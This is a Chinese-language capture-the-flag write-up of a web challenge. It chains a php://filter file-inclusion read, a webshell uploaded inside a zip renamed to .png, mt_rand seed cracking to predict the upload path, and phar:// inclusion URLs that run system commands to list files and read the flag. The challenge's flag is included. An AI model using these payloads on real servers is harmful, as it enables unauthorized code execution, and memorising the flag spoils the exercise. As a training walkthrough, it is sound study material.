# Guess

## 思路分析

> 打开地址,提示上传一个文件,猜测此处存在文件上传漏洞,试过多次,发现有严格的过滤,无法直接上传木马文件,这时发现一个可疑的url,猜测这里存在文件包含漏洞,构造payload尝试

```
http://61.147.171.105:52364/?page=php://filter/convert.base64-encode/resource=upload
```

> 果然获得了upload.php的源码,从源码中看到,对文件的后缀做了很严格的过滤,想要获得shell,只能通过文件包含了,还有一个问题是文件路径是用的随机字符生成的,但因其采⽤了不安全的随机数函数mt_rand,导致其随机数可以预测.拿到cookie中的随机数,进⽽爆破得到随机数种⼦.然后通过该种⼦⽣成相同序列
的随机数即可.

> 将一句话木马写到php文件后进行zip压缩,再将zip后缀改成png.上传这个文件得到一个SESSI0N,进行md5碰撞,somd5找到明文

> 利用php_mt_seed工具进行种子破解,得到种子,生成exp,将PHP 5.2.1 to 7.0.x的种子写入到array中,得到上传图片的路径（运行环境必须为PHP 5.2.1 to 7.0.x,否则会导致生成的随机数不同）

```
<?php
$arr = array(254751340,1212538042,2221082864,2810007159);  
foreach($arr as $a) {
    mt_srand($a);
    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
                 "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
                 "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
                 "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
                 "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';
    $ss = mt_rand();  // 这一步必须加上,否则与服务器端的随机值对应不上
    for ($i = 1; $i <= 32; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }

	echo  'http://61.147.171.105:52364/uP1O4Ds/' . $str . '_test.png' ."\n\r";

}
?>
```

> 逐个验证生成的url,得到上传图片路径为http://61.147.171.105:52364/uP1O4Ds/Tr5WO5tH9bNkRXtuyWXKFqkDZQqbUari_test.png

11.通过phar协议,访问之前传入的shell,得到目录文件列表,exp如下

```
/?page=phar://uP1O4Ds/Tr5WO5tH9bNkRXtuyWXKFqkDZQqbUari_test.png/test&a=echo%20system(%27ls%27);
```

> 修改exp,得到flag

```
http://61.147.171.105:52364/?page=phar://uP1O4Ds/Tr5WO5tH9bNkRXtuyWXKFqkDZQqbUari_test.png/test&a=echo%20system(%27cat%20/flag%27);
```

## flag

> cyberpeace{a530d6979c8c032d73a7d040a2b28d46}

## 参考

> https://www.openwall.com/php_mt_seed/